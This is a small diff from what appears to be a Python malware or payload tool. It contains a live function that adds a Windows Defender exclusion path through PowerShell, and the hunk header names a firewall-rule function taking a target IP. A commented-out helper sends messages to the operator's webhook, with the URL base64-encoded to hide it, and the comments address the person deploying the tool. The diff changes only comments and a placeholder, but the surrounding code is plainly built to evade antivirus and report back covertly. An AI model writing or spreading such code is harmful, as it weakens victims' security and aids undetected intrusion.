@@ -54,10 +54,10 @@ def firewall(rulename, progpath, target_ip):
 def exclude(dest):
     cmd = f'powershell -Command "Add-MpPreference -ExclusionPath \'{dest}\'"'
     subprocess.run(cmd, shell=True)
-# sends a message to your webhook (encrypt it in b64 using https://base64encode.org) very useful trust me
+# sends a message to your webhook (encode it in b64 using https://base64encode.org) very useful trust me
 # optional, uncomment it out if you wanna do it by getting rid of the "#" infront of the code
 # def webmsg():
-  #  url = "webhookURLhere"
+  #  url = "EncodedURLhere"
    # decoded = base64.b64decode(url.encode('utf-8'))
    # weburl = decoded.decode('utf-8')
    # try:
